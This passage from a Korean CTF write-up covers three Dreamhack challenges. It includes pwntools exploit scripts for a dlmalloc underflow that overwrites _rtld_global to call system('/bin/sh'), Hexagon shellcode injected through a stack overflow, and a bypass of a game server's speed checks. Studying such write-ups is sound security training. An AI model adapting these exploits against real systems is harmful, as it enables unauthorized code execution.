+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> Uint64;
+</span></span><span style="display:flex;"><span>  size_t n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Index? &#34;</span>);
+</span></span><span style="display:flex;"><span>  Uint64 <span style="color:#f92672">=</span> readUint64();
+</span></span><span style="display:flex;"><span>  n <span style="color:#f92672">=</span> malloc_usable_size(store);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( Uint64 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">61</span> <span style="color:#f92672">||</span> n <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> Uint64 )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    fwrite(<span style="color:#e6db74">&#34;[ERROR] Out-of-bound index.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x1CuLL</span>, stderr);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> Uint64;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define INUSE_BITS          (PINUSE_BIT|CINUSE_BIT) </span><span style="color:#75715e">// PINUSE_BIT = 1, CINUSE_BIT = 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define is_inuse(p)         (((p)-&gt;head &amp; INUSE_BITS) != PINUSE_BIT)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define chunksize(p)        ((p)-&gt;head &amp; ~(FLAG_BITS))
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define overhead_for(p)     (is_mmapped(p)? MMAP_CHUNK_OVERHEAD : CHUNK_OVERHEAD)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define is_mmapped(p)       (((p)-&gt;head &amp; INUSE_BITS) == 0)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>size_t <span style="color:#a6e22e">dlmalloc_usable_size</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> mem) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (mem <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    mchunkptr p <span style="color:#f92672">=</span> mem2chunk(mem);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (is_inuse(p))
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> chunksize(p) <span style="color:#f92672">-</span> overhead_for(p);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>malloc_usable_size()</code>는 <code>is_inuse(p) == 1</code>, 즉 <code>FLAG_BITS == 0 or 2</code>일 때, <code>chunksize(p) - overhead_for(p)</code>를 return한다.
+이때, <code>chunksize == 0</code>이고 <code>FLAG_BITS == 0</code>이면 <code>0 - 16</code>을 반환하게 되고, unsigned 자료형에서 underflow가 발생하게 된다.</p>
+<p><code>3. Clear</code>메뉴를 이용해 다음 chunk의 <code>chunksize</code>와 <code>FLAG_BITS</code>를 0으로 만들면 Index의 검증을 우회할 수 있고 OOB Write가 가능하다.</p>
+<h3 id="exploit-2">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-2">#</a></h3>
+<p><code>1. Allocation</code>메뉴에서 allocation이 실패하게 될 경우 ld 중간에 할당되는 경우가 있었다. (이유는 모르겠음)
+이를 통해 ld, libc의 base address를 찾고 <code>_rtld_global._dl_rtld_lock_recursive</code>를 <code>system</code>함수의 주소로, <code>_rtld_global._dl_load_lock</code>을 <code>/bin/sh\x00</code>으로 변조하고 <code>4. Exit</code>메뉴를 통해 <code>exit()</code>을 호출하여 shell을 획득할 수 있었다.</p>
+<pre tabindex="0"><code>561066138000-561066139000 r--p 00000000 08:30 971904                     /home/dlmalloc/vuln
+561066139000-56106613a000 r-xp 00001000 08:30 971904                     /home/dlmalloc/vuln
+56106613a000-56106613b000 r--p 00002000 08:30 971904                     /home/dlmalloc/vuln
+56106613b000-56106613c000 r--p 00002000 08:30 971904                     /home/dlmalloc/vuln
+56106613c000-56106613d000 rw-p 00003000 08:30 971904                     /home/dlmalloc/vuln
+7f619dbc1000-7f619dbc4000 rw-p 00000000 00:00 0
+7f619dbc4000-7f619dbe6000 r--p 00000000 08:30 961397                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f619dbe6000-7f619dd5e000 r-xp 00022000 08:30 961397                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f619dd5e000-7f619ddac000 r--p 0019a000 08:30 961397                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f619ddac000-7f619ddb0000 r--p 001e7000 08:30 961397                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f619ddb0000-7f619ddb2000 rw-p 001eb000 08:30 961397                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f619ddb2000-7f619ddb6000 rw-p 00000000 00:00 0
+7f619ddba000-7f619ddbb000 r--p 00000000 08:30 971857                     /home/dlmalloc/libdlmalloc.so
+7f619ddbb000-7f619ddc5000 r-xp 00001000 08:30 971857                     /home/dlmalloc/libdlmalloc.so
+7f619ddc5000-7f619ddc6000 r--p 0000b000 08:30 971857                     /home/dlmalloc/libdlmalloc.so
+7f619ddc6000-7f619ddc7000 r--p 0000b000 08:30 971857                     /home/dlmalloc/libdlmalloc.so
+7f619ddc7000-7f619ddc8000 rw-p 0000c000 08:30 971857                     /home/dlmalloc/libdlmalloc.so
+7f619ddc8000-7f619ddca000 rw-p 00000000 00:00 0
+7f619ddca000-7f619ddcb000 r--p 00000000 08:30 961375                     /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f619ddcb000-7f619ddee000 r-xp 00001000 08:30 961375                     /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f619ddee000-7f619ddf6000 r--p 00024000 08:30 961375                     /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f619ddf6000-7f619ddf7000 rw-p 00000000 00:00 0
+7f619ddf7000-7f619ddf8000 r--p 0002c000 08:30 961375                     /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f619ddf8000-7f619ddf9000 rw-p 0002d000 08:30 961375                     /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f619ddf9000-7f619ddfa000 rw-p 00000000 00:00 0
+7ffe5497a000-7ffe5499b000 rw-p 00000000 00:00 0                          [stack]
+7ffe549a1000-7ffe549a5000 r--p 00000000 00:00 0                          [vvar]
+7ffe549a5000-7ffe549a6000 r-xp 00000000 00:00 0                          [vdso]
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">falloc</span>(size):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, str(size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Failed&#34;</span> <span style="color:#f92672">in</span> r:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(r<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fwrite</span>(store, index, data):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, str(store)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, str(data)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fclear</span>(store, index, size):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, str(store)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, str(size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level = &#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#34;./vuln&#34;, env={&#34;LD_PRELOAD&#34;: &#34;./libdlmalloc.so&#34;})</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;host3.dreamhack.games&#34;</span>, <span style="color:#ae81ff">14260</span>)
+</span></span><span style="display:flex;"><span>falloc(<span style="color:#ae81ff">0xFFFFFFFF00000000</span>)
+</span></span><span style="display:flex;"><span>falloc(<span style="color:#ae81ff">0xFFFFFFFF00000000</span>)
+</span></span><span style="display:flex;"><span>falloc(<span style="color:#ae81ff">0xFFFFFFFF00000000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>falloc(<span style="color:#ae81ff">0x20</span>)
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> falloc(<span style="color:#ae81ff">0x20</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ld_bss_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2000</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x40</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x230000</span>
+</span></span><span style="display:flex;"><span>print(hex(leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x40</span> <span style="color:#f92672">+</span> ld_bss_offset))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fclear(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fwrite(<span style="color:#ae81ff">1</span>, (<span style="color:#ae81ff">0x2f68</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x40</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>])
+</span></span><span style="display:flex;"><span>fwrite(<span style="color:#ae81ff">1</span>, (<span style="color:#ae81ff">0x2968</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x40</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<h2 id="l-baby-hexagon">L. baby-hexagon<a hidden class="anchor" aria-hidden="true" href="#l-baby-hexagon">#</a></h2>
+<h3 id="vulnerability-3">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-3">#</a></h3>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">int main (int argc, char **argv, char **envp);
+0x000202a0      ?         allocframe(SP,#0x110):raw
+0x000202a4      /         immext(##0xfffefe80)
+0x000202a8      \         R2 = add(PC,##0xfffefebe)
+0x000202ac      [   R0 = ##0x40
+0x000202b0      [   R1 = ##0x1
+0x000202b4      [   R3 = ##0x15
+0x000202b8      [   call syscall   ; sym.syscall -&gt; write(0x1, &amp;&#34;Give me something...\n&#34;, 0x15)
+0x000202bc      [   R1 = ##0x3f
+0x000202c0      [   R2 = ##0x0
+0x000202c4      [   R3 = add(FP,##-0x100)
+0x000202c8      [   R4 = ##0x200
+0x000202cc      [   memw(FP+##-0x104) = R0
+0x000202d0      [   R0 = R1
+0x000202d4      [   R1 = R2
+0x000202d8      [   memw(FP+##-0x108) = R2
+0x000202dc      [   R2 = R3
+0x000202e0      [   R3 = R4
+0x000202e4      [   call syscall   ; sym.syscall -&gt; read(0x0, 0x4080xxxx, 0x200)
+0x000202e8      [   R1 = memw(FP+##-0x108)
+0x000202ec      [   memw(FP+##-0x10c) = R0
+0x000202f0      [   R0 = R1
+0x000202f4      [   LR:FP = dealloc_return(FP):raw
+</code></pre><p>Stack frame의 크기보다 큰 입력을 받기 때문에 Buffer Overflow가 발생한다.</p>
+<h3 id="exploit-3">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-3">#</a></h3>
+<p>FP를 바꾸고 원하는 주소(r, w)에 입력받은 뒤, 그 주소에 쉘코드를 쓰고 점프했다.
+지금 보니까 x 권한이 없는데 아마도 _qemu-hexagon_이 쉘코드를 직접 Host에서 실행하는 것이 아니라 TCG를 이용해 실행하기 때문에 되는 것으로 추정된다.</p>
+<pre tabindex="0"><code>00010000-00020000 ---p 00000000 00:00 0
+00020000-00040000 r--p 00000000 00:00 0
+00040000-00052000 rw-p 00000000 00:00 0
+00052000-00060000 rw-p 00000000 00:00 0
+00060000-40000000 ---p 00000000 00:00 0
+40000000-40010000 r--p 00000000 00:00 0
+40010000-40020000 ---p 00000000 00:00 0
+40020000-40820000 rw-p 00000000 00:00 0
+40820000-100000000 ---p 00000000 00:00 0
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_HEXAGON, KS_MODE_LITTLE_ENDIAN)
+</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40600000</span> <span style="color:#75715e"># rw? rwx?</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">R6 = ##0xDD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">R0 = ##</span><span style="color:#e6db74">{</span>hex(addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">R1 = ##</span><span style="color:#e6db74">{</span>hex(addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">R2 = ##</span><span style="color:#e6db74">{</span>hex(addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x50</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(code)
+</span></span><span style="display:flex;"><span>asmcode <span style="color:#f92672">=</span> bytearray(encoding)
+</span></span><span style="display:flex;"><span>asmcode <span style="color:#f92672">+=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;04C00054&#34;</span>) <span style="color:#75715e"># trap0(#0x1)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">R6 = ##0x5D
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">R0 = ##0x0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(code)
+</span></span><span style="display:flex;"><span>asmcode <span style="color:#f92672">+=</span> bytearray(encoding)
+</span></span><span style="display:flex;"><span>asmcode <span style="color:#f92672">+=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;04C00054&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process([&#34;qemu-hexagon-static&#34;, &#34;-strace&#34;, &#34;./vuln&#34;])</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;host3.dreamhack.games&#34;</span>, <span style="color:#ae81ff">12649</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>) <span style="color:#75715e"># FP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x202bc</span>) <span style="color:#75715e"># PC</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> asmcode
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> 
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(addr<span style="color:#f92672">+</span><span style="color:#ae81ff">0x38</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(addr) <span style="color:#75715e"># FP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(addr) <span style="color:#75715e"># PC</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<h2 id="m-cheat">M. cheat<a hidden class="anchor" aria-hidden="true" href="#m-cheat">#</a></h2>
+<h3 id="vulnerability-4">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-4">#</a></h3>
+<p>_client_를 분석해보면 20x20 크기의 맵의 <code>row[i]</code>, <code>col[i]</code>에 저장된 좌표들을 한 번씩만 밟으면 flag를 얻을 수 있다는 코드가 있다.</p>
+<p>_server_는 _client_에서 받는 <code>x</code>, <code>z</code> 좌표가 1초에 1개 이하인지, <code>(x**2 + z**2) / time &lt;= 4.0</code> 인지 검증한다.</p>
+<p>위 두 검증을 피하기 위해서 좌표 전송 사이에 <code>(x**2 + z**2) // 4 + 1</code>만큼의 timeout을 추가하여 flag를 얻을 수 있었다.</p>
+<h3 id="exploit-4">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-4">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> collections <span style="color:#f92672">import</span> deque
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>row <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1040511</span>, <span style="color:#ae81ff">10049</span>, <span style="color:#ae81ff">9537</span>, <span style="color:#ae81ff">9597</span>, <span style="color:#ae81ff">517381</span>, <span style="color:#ae81ff">263677</span>, <span style="color:#ae81ff">523391</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">1044447</span>, <span style="color:#ae81ff">524305</span>, <span style="color:#ae81ff">782335</span>, <span style="color:#ae81ff">655376</span>, <span style="color:#ae81ff">917535</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">262143</span>, <span style="color:#ae81ff">131075</span>, <span style="color:#ae81ff">246755</span>, <span style="color:#ae81ff">948771</span>, <span style="color:#ae81ff">772927</span>, <span style="color:#ae81ff">555519</span>]
+</span></span><span style="display:flex;"><span>col <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1046399</span>, <span style="color:#ae81ff">1037633</span>, <span style="color:#ae81ff">808313</span>, <span style="color:#ae81ff">808297</span>, <span style="color:#ae81ff">810857</span>, <span style="color:#ae81ff">1000553</span>, <span style="color:#ae81ff">607727</span>, <span style="color:#ae81ff">607520</span>, <span style="color:#ae81ff">869694</span>, <span style="color:#ae81ff">476418</span>, <span style="color:#ae81ff">17790</span>, <span style="color:#ae81ff">935232</span>, <span style="color:#ae81ff">671808</span>, <span style="color:#ae81ff">673119</span>, <span style="color:#ae81ff">1000785</span>, <span style="color:#ae81ff">345425</span>, <span style="color:#ae81ff">345425</span>, <span style="color:#ae81ff">515409</span>, <span style="color:#ae81ff">135537</span>, <span style="color:#ae81ff">925441</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>step <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x, r <span style="color:#f92672">in</span> enumerate(row):
+</span></span><span style="display:flex;"><span>    rr <span style="color:#f92672">=</span> bin(r)<span style="color:#f92672">.</span>lstrip(<span style="color:#e6db74">&#34;0b&#34;</span>)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">20</span>, <span style="color:#e6db74">&#34;0&#34;</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> z, f <span style="color:#f92672">in</span> enumerate(rr):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> f <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;1&#34;</span>:
+</span></span><span style="display:flex;"><span>            step[x][z] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            step[x][z] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
+</span></span><span style="display:flex;"><span>    tmp2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
+</span></span><span style="display:flex;"><span>        tmp2 <span style="color:#f92672">+=</span> step[z][x] <span style="color:#f92672">&lt;&lt;</span> z
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> tmp2 <span style="color:#f92672">==</span> col[x]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pm</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> d <span style="color:#f92672">in</span> step:
+</span></span><span style="display:flex;"><span>        print(d)
+</span></span><span style="display:flex;"><span>    print()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;host3.dreamhack.games&#34;</span>, <span style="color:#ae81ff">20609</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>calct <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x, z: (x<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> z<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lastx <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>lastz <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
